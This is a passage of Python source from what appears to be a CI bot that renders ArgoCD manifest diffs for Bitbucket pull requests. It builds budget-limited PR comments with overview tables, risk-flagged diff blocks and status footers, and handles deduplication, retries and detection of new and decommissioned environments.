    # deterministic merge summary directly above it, and in a comment whose
    # whole purpose is now "the verdict, fast" the deterministic narrative
    # is the one that belongs. It stays in full on the page, where length
    # costs nothing. _sanitize_ai_summary is untouched and still runs on
    # that path: it is the prompt-injection sink for model output built
    # from PR-controlled manifests, and moving surfaces is no reason to
    # relax it.
    if ai_summary and profile.is_complete_record:
        lines += [
            "---",
            "### \U0001f916 AI Analysis",
            "",
            ai_summary,
            "",
        ]

    lines += ["---", ""]

    # ── Large-PR summary table ────────────────────────────────────────
    # For large changesets, show a compact overview table first so reviewers
    # can scan all affected apps at a glance before reading the inline diffs.
    # Apps confirmed unchanged are OMITTED from the table (bughunt N2): a
    # 300+3-change PR previously listed all 300 as "no changes" rows, adding
    # pure scroll with zero review value. A one-line count replaces them.
    if is_large:
        lines += [
            "#### Changeset overview",
            "",
            "| App | Status | Changed resources | Diff group |",
            "|-----|--------|--------------------|------------|",
        ]
        # COPS-2579 item 2: label apps that belong to a multi-member
        # fingerprint group, so the table still lists every app (full
        # per-environment transparency) while making the duplication
        # visible and pointing at the one full diff shown below.
        multi_groups = [g for g in diff_groups if len(g[1]) > 1]
        group_label = {}
        for idx, (rep_app, members, _rep_r) in enumerate(multi_groups, 1):
            for m in members:
                group_label[m] = f"Group {idx}"
        no_change_count = 0
        rows = []
        for app, r in sorted(results.items(), key=lambda kv: _app_sort_key(*kv)):
            if r.outcome == OUT_DIFF:
                label = group_label.get(app, "\u2014")
                rows.append(f"| `{app}` | \u26a0\ufe0f changed | {r.n_res} | {label} |")
            elif r.outcome == OUT_DECOMMISSIONED:
                rows.append(f"| `{app}` | \U0001f5d1\ufe0f decommissioned | \u2014 | \u2014 |")
            elif r.outcome == OUT_INDETERMINATE:
                rows.append(f"| `{app}` | \u2754 diff unavailable | \u2014 | \u2014 |")
            elif r.outcome == OUT_ERROR:
                rows.append(f"| `{app}` | \u274c error | \u2014 | \u2014 |")
            else:
                no_change_count += 1
        # Row cap, applied only when the changeset is already past the
        # readability budget: full per-environment transparency stays whole
        # for anything a human might actually scan, but a 774-row table
        # (observed live on acme-config-prod PR #3890) is pure scroll. The
        # complete list always lives in the full-diff view.
        if (budget and total_diff_bytes > budget
                and len(rows) > _OVERVIEW_TABLE_MAX_ROWS):
            hidden = len(rows) - _OVERVIEW_TABLE_MAX_ROWS
            rows = rows[:_OVERVIEW_TABLE_MAX_ROWS]
            rows.append(f"| *(+{hidden} more \u2014 see the full diff view)* "
                        f"| | | |")
        lines += rows
        if no_change_count:
            lines.append(f"| *(+{no_change_count} more)* | \u2705 no changes | \u2014 | \u2014 |")
        lines += [""]

    # ── Routine version-bump rollups ──────────────────────────────────
    # One line per distinct transition (see _routine_bump_signature). The
    # folded apps stay in the overview table above and in every count;
    # only their duplicate diff blocks disappear.
    for _sig in sorted(rollup_by_sig):
        _grps = rollup_by_sig[_sig]
        _apps_all = sorted(a for _g, _mem, _r in _grps for a in _mem)
        _where = (f" \u2014 full diffs in the [full diff view]({artifact_url})"
                  if artifact_url else
                  " \u2014 see ArgoCD or the diff-preview full-diff view")
        lines += [
            f"> \u2b06\ufe0f **Routine version bump** {_routine_bump_label(_sig)} "
            f"\u2014 **{len(set(_envs_from_apps(_apps_all)))} environments**: "
            f"{_fmt_env_list(_apps_all)}{_where}",
            "",
        ]

    # ── Per-app diff sections ─────────────────────────────────────────
    # COPS-2579: no more arbitrary top-N inline cutoff. Every distinct
    # diff (fingerprint group) gets its own full representative diff below;
    # apps are visited in sorted order (_app_sort_key) and any OUT_DIFF app
    # that is not its group's representative is skipped here -- it was
    # already accounted for when the representative rendered.
    #
    # Bulk-region readability budget: everything ABOVE this point (panels,
    # table, rollups) always renders in full. From here on, an ordinary
    # group's diff block only renders while the running body size is under
    # COMMENT_READABLE_BYTES; the remainder collapses into one pointer at
    # the full-diff view after the loop. Risk-flagged groups (deletions,
    # zeroed replicas, VM changes, downgrades) are exempt and render in
    # full wherever they sort — never silently fold a dangerous change.
    collapsed_apps = []
    # Apps evaluated and found clean. Named one per line on the page, folded
    # into a single count in the comment (COPS-2612).
    clean_apps = []
    # Lazy running size: each line's byte size is counted exactly once no
    # matter where it was appended, replacing the full recount per app
    # that made this loop quadratic on exactly the PRs where the budget
    # matters most (census: 473-section bump PRs).
    _sz_state = [0, 0]          # [next line index to count, bytes so far]

    def _body_size():
        idx, total_b = _sz_state
        while idx < len(lines):
            total_b += len(lines[idx].encode("utf-8")) + 1
            idx += 1
        _sz_state[0], _sz_state[1] = idx, total_b
        return total_b

    for app, r in sorted(results.items(), key=lambda kv: _app_sort_key(*kv)):
        if r.outcome == OUT_ERROR:
            any_error = True
            lines += [f"\u274c **`{app}`** \u2014 error: {(r.error or '')[:200]}", ""]

        elif r.outcome == OUT_DECOMMISSIONED:
            # v2.5.11: this app's environment was confirmed decommissioned —
            # the big warning block above already explains it fully. Do NOT
            # render "diff unavailable"/"error" here: that would look like an
            # unresolved problem when this is a settled, understood fact.
            lines += [f"\U0001f5d1\ufe0f **`{app}`** \u2014 environment decommissioned "
                      f"(see warning above)", ""]

        elif r.outcome == OUT_INDETERMINATE:
            any_unknown = True
            unknown_apps.append(app)
            if r.reason == REASON_MISSING_REQUIRED:
                # v2.6.2: spell out the missing required value in full - the
                # developer must know exactly what to add and where, without
                # decoding raw helm stderr (acme-config-dev PR #6848).
                lines += [
                    f"\u274c **`{app}`** \u2014 \u2699\ufe0f **MISSING REQUIRED VALUE "
                    f"\u2014 helm cannot render this environment**",
                ]
                lines += _explain_required_error(r.error)
                lines += _missing_value_remedies()
                lines += [""]
            elif r.reason == REASON_SCHEMA_INVALID:
                # COPS-2554: same clarity principle, adapted to Helm's own
                # multi-violation format instead of a single line/location.
                lines += [
                    f"❌ **`{app}`** — ⚙️ **SCHEMA VALIDATION FAILED "
                    f"— this environment's values violate the chart's schema**",
                ]
                lines += _explain_schema_error(r.error)
                lines += _schema_fix_hints(r.error)
                lines += [
                    "> **Fix:** correct each value listed above in this "
                    "environment's `customer.yaml` (or the `config.yaml` of "
                    "its cohort or ring if every environment needs the fix).",
                    "",
                ]
            elif r.reason == REASON_OCI_NOT_FOUND and r.error:
                # Surface the exact missing chart:version prominently (bughunt):
                # the generic hint below used to be the ONLY thing shown here,
                # hiding which specific package was missing inside r.error -
                # a reviewer had no way to tell what to go publish/fix.
                lines += [
                    f"\u274c **`{app}`** \u2014 **chart version not found in OCI registry**",
                    f"> **{r.error}**",
                    "",
                ]
            else:
                hint = _REASON_HINTS.get(r.reason, "diff could not be computed")
                lines += [
                    f"\u2754 **`{app}`** \u2014 diff unavailable ({hint})",
                    "",
                ]

        elif r.outcome == OUT_DIFF:
            rep_app, members, rep_r = diff_group_for_app[app]
            if app != rep_app:
                # Already rendered together with the group's representative.
                continue
            any_change = True
            total_changed += rep_r.n_res * len(members)
            if app in rolled_apps:
                # Folded into a routine-bump rollup line above: counted in
                # every total and listed in the table, its duplicate diff
                # block omitted.
                continue
            _risky = bool(rep_r.deleted_resources or rep_r.replicas_zeroed
                          or getattr(rep_r, "vm_changes", None)
                          or (rep_r.version_change
                              and _is_version_downgrade(*rep_r.version_change)))
            if budget and not _risky and _body_size() > budget:
                collapsed_apps.extend(members)
                continue
            if len(members) > 1:
                # COPS-2579: name every environment this exact change
                # applies to, right above its one full diff, instead of
                # duplicating that diff once per environment.
                lines += [
                    f"> \U0001f501 Identical diff across "
                    f"**{len(members)} environments**: "
                    f"{_fmt_service_list(members)}",
                    "",
                ]
            # sections now hold the FULL (memory-bounded) list — no more
            # arbitrary top-N inline cutoff (COPS-2579).
            # Pass n_res so the header shows the REAL count (FIX B).
            # COPS-2567: pass the risk headers too, so the truncation note
            # tells the truth about how the shown sections were picked.
            _fold = (getattr(rep_r, "version_fold", None)
                     if profile.version_fold else None)
            _room = max(budget - _body_size(), 0) if budget else None
            _risk_hdrs = (set(rep_r.deleted_resources or [])
                          | set(rep_r.replicas_zeroed or [])
                          | {f["header"]
                             for f in (getattr(rep_r, "vm_changes", None) or [])})
            lines += _format_app_diff_block(
                rep_app, rep_r.sections, rep_r.text, show_diff=True,
                n_res=rep_r.n_res, risk_headers=_risk_hdrs,
                version_fold=_fold, artifact_url=artifact_url,
                size_budget=_room, group_repeats=profile.group_repeats,
                profile=profile)

        else:
            # COPS-2612: on a fleet PR this emitted one green line per clean
            # app -- hundreds of lines saying nothing happened, between the
            # reader and the few lines that matter. Collapsed to a single
            # count in the comment; the page keeps naming every one, because
            # "which environments were evaluated and found clean" is a real
            # question and the page is where the complete record lives.
            #
            # Keyed on inline_diffs, not on is_complete_record, because the
            # real condition is "is this surface carrying the detail right
            # now". That is true on the page, and it is also true in the
            # no-page fallback above -- where collapsing would leave these
            # names in NO surface at all.
            if profile.inline_diffs:
                lines += [f"\u2705 **`{app}`** \u2014 no manifest changes", ""]
            else:
                clean_apps.append(app)

    # ── Clean-app roll-up (COPS-2612) ─────────────────────────────────
    if clean_apps:
        lines += [f"\u2705 **{len(clean_apps)} application(s) unchanged** "
                  f"\u2014 evaluated, nothing to apply.", ""]

    # ── Readability-budget pointer ────────────────────────────────────
    # One line accounting for every ordinary diff block the budget above
    # folded away. Every collapsed app is still in the overview table and
    # in the footer count; nothing risk-flagged can ever land here.
    if collapsed_apps:
        _link = (f"[full diff view]({artifact_url})" if artifact_url
                 else "the diff-preview full-diff view (build-status link) "
                      "or ArgoCD")
        lines += [
            f"> \u2702\ufe0f **{len(collapsed_apps)} more changed app(s) "
            f"omitted here to keep this comment scannable.** Every omitted "
            f"diff is ordinary (no deletions, downgrades, zeroed replicas "
            f"or VM changes) \u2014 read them in full in the {_link}. "
            f"Omitted: {_fmt_service_list(sorted(collapsed_apps), shown=10)}",
            "",
        ]

    # ── Skipped apps note ────────────────────────────────────────────
    if skipped_apps:
        # v2.5.18 (FINDINGS_SCALE S5): the cap cut is deterministic (affected
        # is sorted) and a clean over-cap run IS marked seen, so these SAME
        # apps will not be evaluated on any retry of this commit — only a new
        # commit, a main advance, or raising MAX_APPS_PER_RUN changes the
        # outcome. Say so plainly instead of implying a transient skip.
        lines += [
            f"*{len(skipped_apps)} app(s) over the cap ({MAX_APPS_PER_RUN}) "
            f"will not be evaluated for this commit — raise MAX_APPS_PER_RUN "
            f"(`diff.maxAppsPerRun`) to cover them: "
            f"{', '.join(skipped_apps[:5])}{'...' if len(skipped_apps) > 5 else ''}*", ""]

    # ── New environment(s) section (v2.5.4, Finding 4) ────────────────
    # Bundled new environments (added in the same commit as an existing-app
    # change) get their own section here, using the exact same rendering
    # and classification path as a new-env-only PR (_evaluate_new_envs).
    if new_env_lines:
        lines += ["---"] + new_env_lines

    # ── Appendix (v2.25.0): full rendered output of new environments ──
    # Always the LAST content before the footer: the middle-cut truncation
    # keeps the head of the body, so anything above (summaries, existing-app
    # diffs) survives at the appendix's expense — never the other way round.
    if appendix_lines:
        # The audit appendix is the complete rendered manifest of everything
        # being deleted or created -- hundreds of lines of raw nginx config
        # and YAML. Dumping it into the comment is what made decommission
        # PRs unreadable (seen live on PR #3894, where the comment scrolled
        # through the whole nginx upstream block). It belongs on the
        # full-diff page, which is rendered with budget=0 and keeps it in
        # full; the comment gets a pointer instead.
        if budget:
            _n = sum(1 for l in appendix_lines if l.startswith("### "))
            _link = (f"[full diff view]({artifact_url})" if artifact_url
                     else "the diff-preview full-diff view (build-status link)")
            lines += [
                "---", "",
                f"\U0001f4c4 **Full rendered output** ({_n or 1} section(s), "
                f"complete redacted manifests of every affected resource) is "
                f"kept out of this comment to keep it readable \u2014 read it "
                f"in {_link}.",
                "",
            ]
        else:
            lines += ["---"] + appendix_lines

    # ── Footer ───────────────────────────────────────────────────────
    unknown_note = ""
    if any_unknown:
        unknown_note = (
            f" \u2014 \u2754 {len(unknown_apps)} app(s) could not be evaluated "
            f"(diff unavailable, NOT confirmed unchanged)"
        )
    if any_error or new_env_structural:
        if any_error and new_env_structural:
            status = (f"\u274c Error running diff, AND {new_env_desc or 'new environment(s) have a structural problem'}")
        elif new_env_structural:
            status = f"\u274c {new_env_desc or 'New environment(s) have a structural problem that must be fixed before merge'}"
        else:
            status = "\u274c Error running diff"
    elif any_change:
        status = f"\u26a0\ufe0f {total_changed} resource(s) will change{unknown_note}"
    elif any_unknown:
        status = (f"\u2754 Diff incomplete \u2014 {len(unknown_apps)} app(s) could not "
                  f"be evaluated (NOT confirmed unchanged)")
    else:
        status = "\u2705 No manifest changes"

    # v2.5.8: the downgrade must also be visible in the one-line status —
    # including the case where manifests are identical but the chart
    # targetRevision still moves DOWN (ArgoCD will redeploy on merge).
    if downgrades:
        status += " | \U0001f53b CHART DOWNGRADE \u2014 verify intentional"

    # Machine-readable token embedded in the footer. Used by process_pr to decide
    # whether to re-run without parsing the human-readable status string.
    # Tokens: clean | permanent | transient
    # - clean     : all apps diffed successfully (no retry, mark seen)
    # - permanent : oci_not_found or hard error (no retry, mark seen)
    # - transient : diff unavailable on transient blip (retry next loop)
    if any_error or new_env_structural:
        _status_token = "permanent"
    elif any_unknown:
        # Distinguish oci_not_found (permanent) from soft indeterminate (transient)
        resolved = [_result(v) for v in app_results.values()]
        indet    = [r for r in resolved if r.outcome == OUT_INDETERMINATE]
        # Permanent if ANY app has a permanent reason (e.g. oci_not_found mixed
        # with transient ones). A mixed PR is still "permanent" for dedup purposes
        # because the FAILED build status requires human action regardless.
        has_permanent = any(r.reason in PERMANENT_REASONS for r in indet)
        _status_token = "permanent" if has_permanent else "transient"
    else:
        _status_token = "clean"

    lines += ([
        # Above the separator, never between it and the Status line:
        # _truncate_comment locates the footer with rfind("\n---\n**Status:**")
        # and splitting that sequence loses the [clean]/[base:] tokens, which
        # the poll loop parses for SHA dedup. Caught by
        # test_s2_truncated_comment_keeps_footer_tokens (COPS-2609).
        # Absent on the complete-record surface, which does not point at
        # itself (COPS-2611).
        _full_view,
        "",
    ] if _full_view else []) + [
        "---",
        f"**Status:** {status}",
        f"*{_ts()} \u2014 {COMMENT_MARKER} [{_status_token}]" + (f" [base:{base_sha[:8]}]" if base_sha else "") + "*",
    ]
    # Collapse repeated horizontal rules. Panels are assembled
    # independently and several of them own a trailing separator, so a PR
    # that skips the panels in between would otherwise render "---" twice
    # in a row, which markdown shows as an empty band.
    deduped = []
    for ln in lines:
        if ln == "---":
            prev = next((p for p in reversed(deduped) if p.strip()), None)
            if prev == "---":
                continue
        deduped.append(ln)
    return "\n".join(deduped)

# ── Per-PR processing (isolated) ──────────────────────────────────────
def process_pr(pr, path_map, base_sha="", repo=None):
    """Process one PR. All exceptions are caught so other PRs are not affected.

    COPS-2507 multi-repo: `repo` is the Bitbucket repo slug this PR belongs
    to; `path_map` MUST be that repo's partition (path_map_for_repo). Loop
    state is keyed by (repo, pr_id) — PR ids collide across repos.
    """
    repo   = repo or BB_REPO
    pr_id  = pr["id"]
    pr_sha = pr["source"]["commit"]["hash"]
    # COPS-2564: attribute Bitbucket cost to THIS PR. A delta, not a private
    # counter: the cache is shared, so what this measures is the calls the PR
    # actually caused, which is the number worth knowing when a mass PR makes
    # the whole pool slow.
    _bb_at_pr_start = bb_call_stats()
    _register_sha_repo(pr_sha, repo)
    if base_sha:
        _register_sha_repo(base_sha, repo)
    sk     = (repo, pr_id)   # state key for _seen/_force_recompute/_pr_chart_targets
    dest   = pr["destination"]["branch"]["name"]
    _title = pr['title']
    _title_disp = _title if len(_title) <= 80 else _title[:80] + "..."
    print(f"  PR {repo}#{pr_id}: {_title_disp!r} -> {dest} ({pr_sha[:8]})")

    if dest != "main":
        return

    # COPS-2575: arm the supersede check. Atomic pop, not a clear: a webhook
    # that landed while this PR sat queued behind others (MAX_PR_WORKERS=3,
    # minutes on a busy iteration) wrote its hint BEFORE we got here, and
    # clearing it would destroy the only signal that this snapshot is already
    # stale. Popping also means a hint the snapshot already reflects (the very
    # webhook that started this iteration) cannot abort a correct run.
    _armed_newer = _arm_supersede(sk, pr_sha)
    if _armed_newer:
        _n = _note_supersede_abort(sk)
        log(f"PR #{pr_id}: superseded before render started "
            f"({pr_sha[:8]} -> {_armed_newer[:8]}), skipping "
            f"(consecutive={_n})", pr=pr_id, event="superseded",
            old_sha=pr_sha[:12], new_sha=_armed_newer[:12], stage="entry")
        return  # _seen NOT set → the newer sha is rendered on the next pass

    # COPS-2617: the same check for the DESTINATION branch. A merge on main
    # invalidates this snapshot exactly as a push to the PR's own branch
    # does, and it used to be noticed only AFTER a full render, by comparing
    # the [base:] token on the already-published comment. Measured on
    # acme-config-prod: 4 of 6 passes across two large PRs rendered against
    # an already-dead base, and a 564-app comment was rewritten 3 times in
    # 8 minutes from unrelated merges.
    #
    # Peek, never pop: this hint is shared by every open PR against the
    # branch, so the first PR to read it must not consume it. It clears
    # naturally when a render finally starts from the new base.
    _newer_base = _base_superseded_by(repo, dest, base_sha, sk=sk)
    if _newer_base:
        _n = _note_supersede_abort(sk)
        log(f"PR #{pr_id}: base branch advanced before render started "
            f"({(base_sha or '')[:8]} -> {_newer_base[:8]}), skipping "
            f"(consecutive={_n})", pr=pr_id, event="base_superseded",
            old_sha=(base_sha or "")[:12], new_sha=_newer_base[:12],
            stage="entry")
        return  # _seen NOT set → rendered against the new base next pass

    # A chart republish (JFrog webhook) can force this PR to recompute once,
    # bypassing both dedups below. Consume-once: if the recompute then fails,
    # the error-comment retry path takes over on the next iteration.
    with _seen_lock:
        forced = sk in _force_recompute
        if forced:
            _force_recompute.discard(sk)
            print(f"    Forced recompute: a chart this PR renders with was republished")

    # In-memory dedup: skip same SHA already processed in this pod run
    with _seen_lock:
        if not forced and _seen.get(sk) == (pr_sha, base_sha):
            print(f"    Skipping: SHA {pr_sha[:8]} (base {base_sha[:8] if base_sha else '?'}) already processed in this run")
            return

    # COPS-2546: transient-failure backoff. Skips a growing number of
    # iterations between retries of a PR whose last pass failed transiently,
    # so a quota exhaustion cannot turn into a retry storm. A new push
    # bypasses and resets it (handled inside the helper).
    if not forced and _backoff_should_skip(sk, pr_sha):
        print(f"    Skipping: transient-failure backoff active for SHA {pr_sha[:8]} (will retry)")
        return

    # Cross-pod dedup: existing comment already covers this exact SHA
    existing_id, comment_sha, comment_raw = find_existing_comment(pr_id, repo=repo)
    if not forced and comment_sha == pr_sha[:8]:
        # Use the machine-readable [token] embedded in the comment footer (1.9.1+)
        # to decide if a re-run is needed. For legacy comments that lack the token
        # fall back to string matching on human-readable text.
        _token = _extract_status_token(comment_raw)
        if _token:
            rerun = (_token == "transient")
        else:
            # Legacy fallback: parse human-readable strings.
            rerun = (
                "Diff incomplete" in comment_raw
                or "diff unavailable" in comment_raw
                or "Error running diff" in comment_raw
                or "Error processing diff" in comment_raw
                or ("\u274c" in comment_raw and ("invalid session" in comment_raw
                                                 or "error:" in comment_raw))
                or "no-diff ERR:" in comment_raw
            )
        # Recompute when the DESTINATION moved: the published diff was
        # rendered against the main sha embedded in the footer; once main
        # advances, the comment no longer answers "what will merging do?"
        # (bughunt F1). Legacy comments without a [base:] token are treated
        # as stale once and rewritten with the token.
        if not rerun and base_sha:
            base_m = re.search(r"\[base:([0-9a-f]{4,12})\]", comment_raw)
            if not base_m or base_m.group(1) != base_sha[:8]:
                rerun = True
                # Structured (not just print): this is the F1 fix actually
                # firing — worth counting/alerting on, unlike the narrative
                # trace lines around it (bughunt N7).
                log(f"PR #{pr_id}: recompute triggered by main advancing "
                    f"({base_m.group(1) if base_m else 'legacy'} -> {base_sha[:8]})",
                    pr=pr_id, event="main_advanced_recompute")
        if rerun:
            print(f"    Re-running: previous comment for SHA {pr_sha[:8]} was not clean, retrying diff")
            # existing_id is kept — the comment will be updated in place, not duplicated.
        else:
            with _seen_lock:
                _seen[sk] = (pr_sha, base_sha)
            print(f"    Skipping: comment up to date for SHA {pr_sha[:8]}")
            # Fix potential stuck INPROGRESS from a previously killed pod
            fix_stuck_inprogress(pr_sha, pr_id, comment_raw, repo=repo)
            return

    try:
        changed, renames = get_pr_changed_files(pr_id, repo=repo)
        # COPS-2507: repo scope filter. Only applies when the repo entry has
        # a configured scope (see DIFF_REPOS above). Production runs stage
        # with no scope, so a PR outside every ArgoCD app's paths (e.g. the
        # aws/ legacy-pipeline tree) just matches zero apps below and gets
        # the historical "No ArgoCD apps affected" comment+status, same as
        # any other unmatched PR — it is not silenced. Scope filtering below
        # is for a repo that wants a tree fully hidden regardless of app
        # matching; when configured, files outside the scope prefixes are
        # invisible to BOTH affected-app matching and new-env detection, and
        # a PR left with ZERO in-scope files is skipped in full silence (see
        # below); mixed PRs proceed with only their in-scope files.
        scopes = REPOS.get(repo, {}).get("scopes") or []
        if scopes:
            n_before = len(changed)
            changed  = [f for f in changed
                        if any(f.startswith(s) for s in scopes)]
            renames  = {o: n for o, n in renames.items()
                        if any(o.startswith(s) or n.startswith(s) for s in scopes)}
            if n_before != len(changed):
                print(f"    Scope filter [{'|'.join(scopes)}]: "
                      f"{n_before} -> {len(changed)} files in scope")
            if n_before > 0 and not changed and not renames:
                # ENTIRELY out-of-scope PR (e.g. aws/-only in stage): full
                # silence — no comment, no build status. These PRs belong to
                # the legacy pipeline's team; a bot comment or a green
                # "diff-preview" check there is noise at best and could be
                # misread as ArgoCD validation. PRs with in-scope files (even
                # if they match no app) keep the historical "No ArgoCD apps
                # affected" comment+status behavior.
                print(f"    Entirely out of scope for {repo} — skipping silently")
                with _seen_lock:
                    _seen[sk] = (pr_sha, base_sha)
                return
        # Single O(files x paths) match for the whole PR (v2.4.8 perf fix) —
        # _app_to_files is reused below for the version-bump detection pass
        # instead of every app independently rescanning changed x path_map.
        affected, _app_to_files = _match_files_to_apps(changed, path_map)
        print(f"    Changed files: {len(changed)} | Affected apps: {len(affected)}")

        # v2.12.0 (COPR-31637): hard guard. A value file that sets
        # appspace.microservices.definitions to null/empty wipes every
        # per-service image.name override on merge (helm `merge` collapses the
        # map), silently breaking image names -> ImagePullBackOff across the
        # whole environment. This is checked BEFORE any diff/app logic and, if
        # found, blocks the merge outright with a red status: no rendered diff
        # would make the danger obvious, so we refuse instead of commenting a
        # green diff. Runs on every PR regardless of affected apps.
        wiped = _detect_wiped_definitions(changed, pr_sha, repo=repo)
        if wiped:
            _files_md = "\n".join(f"- `{w}`" for w in wiped)
            desc = (f"BLOCKED: {len(wiped)} file(s) empty out "
                    f"microservices.definitions (wipes image overrides)")
            post_build_status(pr_sha, "FAILED", desc, pr_id=pr_id)
            body = (
                f"## \U0001f52d {STATUS_NAME}\n\n"
                f"{_comment_header(pr_sha)}\n\n"
                f"\u26d4 **This PR is blocked from merging — dangerous change "
                f"detected.**\n\n"
                f"The following value file(s) set "
                f"`appspace.microservices.definitions` to an **empty/null "
                f"map**:\n\n{_files_md}\n\n"
                f"On merge, Helm merges this map **last**, so a null/empty "
                f"`definitions` **wipes every per-service `image.name` "
                f"override** the chart ships (e.g. `appspace-platformservice`, "
                f"`appspace-webhookservice`, `appspace-screenshot`). Each "
                f"affected microservice then falls back to the derived "
                f"`appspace-<key>` name, which for these services points at a "
                f"registry path that has never held an image \u2014 causing "
                f"**ImagePullBackOff across the whole environment** (this is "
                f"exactly what happened in COPR-31637).\n\n"
                f"**How to fix:** either remove the `definitions:` key entirely "
                f"(so the chart's own map is kept), or give it real children. "
                f"Never leave `definitions:` present but empty.\n\n"
                f"---\n**Status:** \u26d4 Blocked \u2014 empty "
                f"`microservices.definitions` would break image names on merge\n"
                f"*{_ts()} \u2014 {COMMENT_MARKER} [blocked]"
                + (f" [base:{base_sha[:8]}]" if base_sha else "") + "*"
            )
            upsert_comment(pr_id, body, existing_id, repo=repo)
            with _seen_lock:
                _seen[sk] = (pr_sha, base_sha)
            return

        # v2.5.4 (Finding 4): always check for new-env candidates, not just
        # when `affected` is empty. _detect_new_env_candidates already
        # excludes any file matching an existing app's path_map entry, so
        # this is safe to run unconditionally. Before this fix, a PR that
        # ALSO touched an existing app never ran this check at all, silently
        # dropping a bundled new environment from evaluation entirely —
        # confirmed live with both a broken (#6646) and a fully valid
        # (#6652) new environment.
        # COPS-2545 (F2): synthesize rename pairings from declared identity
        # BEFORE any consumer runs, so the folder-move machinery, the
        # new-env exclusion and the decommission detector all see the move.
        renames = _augment_renames_with_identity_moves(
            changed, renames, path_map, base_sha, pr_sha, repo=repo)
        new_env_candidates = _detect_new_env_candidates(changed, path_map, renames, pr_sha=pr_sha, repo=repo)
        if new_env_candidates:
            log(f"PR #{pr_id}: {len(new_env_candidates)} new env candidate(s): "
                f"{[e['name'] for e in new_env_candidates]}", pr=pr_id)

        # v2.5.10 (explicit request): detect FULL environment decommissions
        # (identity file deleted, no successor anywhere — distinct from a
        # tier move or a rebuild under a new name) so the comment can shout
        # a dedicated warning: which environment, what version, what is
        # being removed. Structural detection needs no network UNLESS the
        # identity file has a rename pairing (v2.5.15: that pairing is then
        # identity-verified via one cached fetch pair, not assumed).
        decommission_candidates = _detect_env_decommission_candidates(
            changed, path_map, renames, main_sha=base_sha, pr_sha=pr_sha)
        decommission_lines, decommissioned_envs = ([], [])
        decom_full_lines = []
        if decommission_candidates:
            decommission_lines, decommissioned_envs, decom_full_lines = \
                _evaluate_env_decommissions(decommission_candidates, pr_sha,
                                            base_sha, with_full_output=True)
            if decommissioned_envs:
                log(f"PR #{pr_id}: environment decommission detected: "
                    f"{decommissioned_envs}", "WARNING", pr=pr_id)

        if not affected:
            # No existing ArgoCD app matched the changed files.
            if new_env_candidates:
                post_build_status(pr_sha, "INPROGRESS", "Rendering new environment(s)...", pr_id=pr_id)
                new_env_lines, structural_envs, total_new, new_env_full_lines = \
                    _evaluate_new_envs(new_env_candidates, pr_sha,
                                       with_full_output=True)

                lines = [
                    f"## \U0001f52d {STATUS_NAME}", "",
                    _comment_header(pr_sha), "",
                ] + new_env_lines

                # v2.25.0: complete rendered output after the summary. The
                # comment inlines what fits (footer-preserving truncation in
                # upsert_comment); the full-diff artifact below keeps it all.
                if new_env_full_lines:
                    lines += ["---"] + new_env_full_lines

                if structural_envs:
                    state = "FAILED"
                    desc = (f"{len(structural_envs)} new environment(s) have a "
                            f"structural config problem: {', '.join(structural_envs)}")
                    status_line = (
                        f"**Status:** \u274c New environment(s) with a structural "
                        f"problem that must be fixed before merge: "
                        f"{', '.join(f'`{e}`' for e in structural_envs)}")
                    clean_tag = "[blocked]"
                else:
                    state = "SUCCESSFUL"
                    desc = f"{len(new_env_candidates)} new environment(s), ~{total_new} resource(s) to create"
                    status_line = (
                        f"**Status:** \u2705 New environment(s) - all resources "
                        f"will be created on merge")
                    clean_tag = "[clean]"
                lines += [
                    "---",
                    status_line,
                    f"*{_ts()} \u2014 {COMMENT_MARKER} {clean_tag}" + (f" [base:{base_sha[:8]}]" if base_sha else "") + "*",
                ]
                body = "\n".join(lines)
                # v2.25.0: this path never persisted a full-diff artifact, so
                # new-env-only PRs had no full-output page at all. Save it
                # BEFORE the final build status so the status icon deep-links
                # to the complete page (same standard as the diff path).
                _save_diff_ui_artifact(repo, pr_id, pr_sha, body,
                                       base_sha=base_sha)
                post_build_status(pr_sha, state, desc, pr_id=pr_id)
                upsert_comment(pr_id, body, existing_id, repo=repo)
                with _seen_lock:
                    _seen[sk] = (pr_sha, base_sha)
                return

            # No apps affected and no new env pattern found.
            print(f"    No ArgoCD apps affected - posting SUCCESSFUL")
            post_build_status(pr_sha, "SUCCESSFUL",
                "No ArgoCD apps affected by this PR", pr_id=pr_id)
            no_apps_body = (
                f"## \U0001f52d {STATUS_NAME}\n\n"
                f"{_comment_header(pr_sha)}\n\n"
                f"\u2705 **No ArgoCD apps are currently affected by the files "
                f"changed in this commit.**\n\n"
                f"This is expected for documentation, tooling, or script changes that "
                f"do not affect any ArgoCD-managed environment configuration.\n\n"
                f"---\n**Status:** \u2705 No ArgoCD apps affected\n"
                f"*{_ts()} \u2014 {COMMENT_MARKER} [clean]" + (f" [base:{base_sha[:8]}]" if base_sha else "") + "*"
            )
            upsert_comment(pr_id, no_apps_body, existing_id, repo=repo)
            with _seen_lock:
                _seen[sk] = (pr_sha, base_sha)
            return

        print(f"    Apps: {affected}")
        post_build_status(pr_sha, "INPROGRESS", "Running ArgoCD diff...", pr_id=pr_id)

        # v2.5.11 (live PR #6677): apps whose environment was CONFIRMED
        # decommissioned above must never enter the normal diff pipeline —
        # their identity file is confirmed gone, so a real render can only
        # ever fail. Left in, they land as OUT_INDETERMINATE/render_failed
        # (a RETRYABLE reason), so the PR is never marked seen and the pod
        # re-diffs it forever, with a build status that misleadingly says
        # "will retry automatically" for something already fully explained
        # by the decommission warning. Give them their own dedicated,
        # non-retried, non-blocking result directly instead.
        decommissioned_apps = _apps_to_skip_for_decommission(
            decommission_candidates, decommissioned_envs)
        app_results = {}
        if decommissioned_apps:
            log(f"PR #{pr_id}: skipping normal diff for {len(decommissioned_apps)} "
                f"confirmed-decommissioned app(s): {sorted(decommissioned_apps)}",
                pr=pr_id)
            for app in decommissioned_apps:
                app_results[app] = DiffResult(
                    "", [], 0, False, None, OUT_DECOMMISSIONED, "confirmed_decommission")
            affected = [a for a in affected if a not in decommissioned_apps]

        skipped_apps = []
        _record_affected_apps(len(affected))
        if len(affected) > MAX_APPS_PER_RUN:
            skipped_apps = affected[MAX_APPS_PER_RUN:]
            affected    = affected[:MAX_APPS_PER_RUN]
            print(f"    Capped to {MAX_APPS_PER_RUN} apps "
                  f"({len(skipped_apps)} skipped)")
        # v2.5.11: total app count this run is actually responsible for,
        # for the SIGTERM-drain safety check below — affected was reduced by
        # decommissioned_apps above, but those already have a final result
        # pre-populated in app_results, so they must still count toward the
        # expected total or a genuine partial-batch abort on the REMAINING
        # apps would go undetected (len(app_results) would look "complete"
        # too early).
        total_apps_this_run = len(affected) + len(decommissioned_apps)

        app_results   = app_results  # pre-populated above with any confirmed-decommission results
